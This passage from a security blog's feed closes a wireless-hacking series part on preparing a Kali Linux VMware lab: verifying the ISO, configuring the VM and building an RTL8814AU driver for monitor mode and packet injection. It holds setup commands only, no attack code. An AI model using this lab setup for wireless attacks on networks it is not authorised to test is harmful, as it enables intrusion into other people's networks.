&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;checking&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;trustdb&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;marginals&lt;/span&gt; &lt;span class="n"&gt;needed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="n"&gt;completes&lt;/span&gt; &lt;span class="n"&gt;needed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;trust&lt;/span&gt; &lt;span class="n"&gt;model&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;pgp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;depth&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;valid&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="n"&gt;signed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;trust&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;next&lt;/span&gt; &lt;span class="n"&gt;trustdb&lt;/span&gt; &lt;span class="n"&gt;check&lt;/span&gt; &lt;span class="n"&gt;due&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mi"&gt;2028&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;04&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Good&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Kali Linux Archive Automatic Signing Key (2025) &amp;lt;devel@kali.org&amp;gt;&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ultimate&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Verifying&lt;/span&gt; &lt;span class="n"&gt;ISO&lt;/span&gt; &lt;span class="n"&gt;checksum&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;kali&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;linux&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;2025.1&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;installer&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;amd64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;iso&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;OK&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;kali&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;linux&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;2025.1&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;installer&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;amd64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;iso&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;torrent&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;FAILED&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;read&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt; &lt;span class="n"&gt;If&lt;/span&gt; &lt;span class="n"&gt;you&lt;/span&gt; &lt;span class="n"&gt;see&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;kali-linux-2025.1c-installer-amd64.iso: OK&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;above&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;ISO&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;verified&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;safe&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 class="heading-element" id="vmware-workstation"&gt;&lt;span&gt;23 VMware Workstation&lt;/span&gt;
 &lt;a href="#vmware-workstation" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;To begin, open &lt;strong&gt;VMware Workstation&lt;/strong&gt; on your system. This graphical tool will allow you to easily manage virtual machines. Once the application is open, click on the &lt;strong&gt;&amp;ldquo;Create a New Virtual Machine&amp;rdquo;&lt;/strong&gt; button.&lt;/p&gt;
&lt;p&gt;In the wizard that appears, select &lt;strong&gt;&amp;ldquo;Installer disc image file (iso)&amp;rdquo;&lt;/strong&gt; and browse to the &lt;strong&gt;Kali Linux ISO&lt;/strong&gt; you previously downloaded. Next, choose the OS type as &lt;strong&gt;Linux&lt;/strong&gt;, and for the version, select &lt;strong&gt;Debian 10.x 64-bit&lt;/strong&gt;—this works well for Kali Linux.&lt;/p&gt;
&lt;div style="display: flex; justify-content: space-between;"&gt;
 &lt;img src="https://Pr0xyG33k.github.io/posts/_wireless/images/vm_create.png" alt="create" style="width: 50%; margin-right: 10px;" /&gt;
 &lt;img src="https://Pr0xyG33k.github.io/posts/_wireless/images/vm_conf.png" alt="conf" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;p&gt;You’ll then be prompted to assign system resources to the VM. It is recommended to allocate &lt;strong&gt;at least 2GB of RAM&lt;/strong&gt;, but &lt;strong&gt;4GB (4096MB)&lt;/strong&gt; is ideal if your host machine allows it. You should also assign &lt;strong&gt;2 or more CPU cores&lt;/strong&gt; to ensure smooth performance. After this, you’ll create a virtual hard disk—make sure it is &lt;strong&gt;at least 20GB&lt;/strong&gt;, and &lt;strong&gt;dynamically allocated&lt;/strong&gt; to save space.&lt;/p&gt;
&lt;p&gt;Once these steps are complete, click &lt;strong&gt;Finish&lt;/strong&gt; to create and launch the virtual machine.&lt;/p&gt;
&lt;h3 class="heading-element" id="configuration"&gt;&lt;span&gt;23.1 Configuration&lt;/span&gt;
 &lt;a href="#configuration" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Before installing Kali, a few adjustments to the virtual hardware settings are necessary. In VMware Workstation, select your newly created Kali VM and click Edit Virtual Machine Settings to access its configuration panel.&lt;/p&gt;
&lt;p&gt;Inside this panel, make sure that the Kali Linux ISO is correctly attached as the boot media under the CD/DVD section. Next, review the network settings. By default, the network is set to NAT, which provides Internet access through your host. However, if you want the VM to be visible on your local network (useful for advanced testing), you can change it to Bridged mode and select your host interface.&lt;/p&gt;
&lt;p&gt;Finally, ensure that a USB controller (either USB 2.0 or 3.0) is present and enabled in the settings. This will be important later when attaching a USB Wi-Fi adapter.&lt;/p&gt;
&lt;h3 class="heading-element" id="installation"&gt;&lt;span&gt;23.2 Installation&lt;/span&gt;
 &lt;a href="#installation" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Now that your VM is ready, start it up. The system should boot directly into the Kali Linux ISO. On the boot menu, select &amp;ldquo;Graphical Install&amp;rdquo; to launch the graphical installer, which is easier for most users to navigate.&lt;/p&gt;
&lt;p&gt;Proceed through the installation by choosing your language, country, and keyboard layout. You’ll then configure your network settings, including a hostname (e.g., kali-vm) and an optional domain name. After that, create a user account and password. Kali now defaults to a non-root user, which improves security and mirrors real-world Linux use.&lt;/p&gt;
&lt;p&gt;For disk setup, select Guided - use entire disk, which is the simplest and safest option for a VM. Confirm your partitioning choices and let the installer complete the process. Once installation is finished, remove the ISO from the virtual CD-ROM and reboot the VM.&lt;/p&gt;
&lt;h3 class="heading-element" id="settings"&gt;&lt;span&gt;23.3 Settings&lt;/span&gt;
 &lt;a href="#settings" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;If you plan to use tools that require raw access to a wireless interface, such as aircrack-ng or bettercap, you’ll need to passthrough a USB Wi-Fi adapter that supports monitor mode and packet injection.
The first step is to install the necessary packages that will allow Kali to build the driver for your USB Wi-Fi adapter&lt;/p&gt;
&lt;p&gt;The driver you’re installing, &lt;code&gt;8814au&lt;/code&gt;, is designed for Wi-Fi cards that use the &lt;strong&gt;Realtek RTL8814AU chipset&lt;/strong&gt;. Before proceeding, it’s crucial to verify that your Wi-Fi card uses this chipset, as the driver will only work with compatible hardware &lt;a href="https://docs.alfa.com.tw/Support/Linux/RTL8814AU/"target="_blank" rel="external nofollow noopener noreferrer"&gt;ALFA Network RTL8814AU Linux Driver Support&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To check your Wi-Fi card’s chipset, you can use the &lt;code&gt;lsusb&lt;/code&gt; or &lt;code&gt;lspci&lt;/code&gt; command in your terminal (depending on whether it’s a USB or PCI card).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo apt install -y linux-headers-&lt;span class="k"&gt;$(&lt;/span&gt;uname -r&lt;span class="k"&gt;)&lt;/span&gt; build-essential bc dkms git libelf-dev rfkill iw&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;If you encounter an error while installing the dependencies, make sure your system is up to date by running &lt;code&gt;sudo apt update &amp;amp;&amp;amp; sudo apt upgrade&lt;/code&gt;. If the issue persists, check that your Linux kernel is compatible with the &lt;code&gt;linux-headers&lt;/code&gt; package you installed.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;To do this, plug your adapter into the host machine. Then, with the Kali VM powered off, open Edit Virtual Machine Settings. Click Add and choose USB Controller, then select USB Device and pick your USB Wi-Fi adapter from the list.&lt;/p&gt;
&lt;div style="display: flex; justify-content: center;"&gt;
 &lt;img src="https://Pr0xyG33k.github.io/posts/_wireless/images/vm_usb.png" alt="usb" style="width: 50%; margin-right: 10px;"&gt;
&lt;/div&gt;
&lt;p&gt;The first task is to prepare a location on your system where the downloaded driver files will be stored. This is important to keep everything organized and ensure that the installation files are easily accessible. To create the directory, you will use the &lt;code&gt;mkdir&lt;/code&gt; command, which stands for &amp;ldquo;make directory.&amp;rdquo; The &lt;code&gt;-p&lt;/code&gt; flag ensures that if the directory does not already exist, it will be created. The directory we will create is called &lt;code&gt;src&lt;/code&gt;, and it will be placed in your home directory (&lt;code&gt;~/&lt;/code&gt;), which is a standard practice for organizing source files.&lt;/p&gt;
&lt;p&gt;After running this command, you’ll have a new folder named &lt;code&gt;src&lt;/code&gt; in your home directory. This folder will be used specifically for storing the driver files that you will download in later steps.&lt;/p&gt;
&lt;p&gt;Now that you&amp;rsquo;re in the correct directory, it&amp;rsquo;s time to download the driver. In this case, the driver files are hosted on GitHub, a popular platform for sharing and collaborating on code. The easiest way to get the driver is by cloning the GitHub repository that contains it. To clone a repository, you use the &lt;code&gt;git clone&lt;/code&gt; command, which will create a local copy of the repository on your system. The repository we’re using is hosted at &lt;code&gt;https://github.com/morrownr/8814au.git&lt;/code&gt;. This repository contains the necessary files to install the driver for your device.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ git clone https://github.com/morrownr/8814au.git&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The installation process is handled by a script named &lt;code&gt;install-driver.sh&lt;/code&gt;. Running this script will compile and install the necessary files to get the driver working on your system. There are two ways to execute the script, both of which require elevated privileges since you’re installing software that will affect system-wide settings.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo ./install-driver.sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;By following these steps, you will have successfully downloaded, installed, and configured the necessary driver for your device. Rebooting your system afterward will ensure that the installation is fully effective.&lt;/p&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;If you are asked to choose a provider, make sure to choose the one that corresponds to your version of the Linux kernel (for example, &lt;code&gt;linux510-headers&lt;/code&gt; for Linux kernel version 5.10). If you install the incorrect version, you&amp;rsquo;ll have to uninstall it and install the correct version.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Once added, start the VM again. Inside Kali Linux, open a terminal and run:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ iwconfig
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;lo no wireless extensions.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;eth0 no wireless extensions.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wlan0 IEEE 802.11b ESSID:&lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt; Nickname:&lt;span class="s2"&gt;&amp;#34;WIFI@RTL8814AU&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Mode:Monitor Frequency:2.472 GHz Access Point: Not-Associated 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Sensitivity:0/0 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Retry:off RTS thr:off Fragment thr:off
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Power Management:off
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Link Quality:0 Signal level:0 Noise level:0
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Tx excessive retries:0 Invalid misc:0 Missed beacon:0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Monitor mode allows your Wi-Fi adapter to capture all radio packets in the air, even those that are not destined for your device. This is essential for performing attacks like packet injection or capturing packets for penetration testing.&lt;/p&gt;
&lt;h2 class="heading-element" id="conclusion"&gt;&lt;span&gt;24 Conclusion&lt;/span&gt;
 &lt;a href="#conclusion" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In this second part, we have focused on setting up a secure and isolated environment to safely explore wireless hacking techniques. By preparing the necessary tools and addressing potential conflicts with networking processes, we’ve laid the groundwork for testing wireless security in a controlled manner. This is a crucial step before diving into more complex attacks and deeper exploitation of vulnerabilities.&lt;/p&gt;
&lt;p&gt;With these configurations in place, you are now ready to experiment and start using tools like Wifite for capturing traffic and testing wireless network security. The next step will take us into the world of active attacks and intrusion attempts in Part 3, where we will explore the first of many practical wireless attacks.&lt;/p&gt;</description></item><item><title>Wireless Hacking Part 1</title><link>https://Pr0xyG33k.github.io/posts/wireless01/</link><pubDate>Tue, 20 May 2025 10:48:10 +0200</pubDate><author>1024@Pr0xyG33k.github.io (ProxyGeek)</author><guid>https://Pr0xyG33k.github.io/posts/wireless01/</guid><category domain="https://Pr0xyG33k.github.io/categories/guides/">Guides</category><description>&lt;h2 class="heading-element" id="about"&gt;&lt;span&gt;31 About&lt;/span&gt;
 &lt;a href="#about" class="heading-mark"&gt;
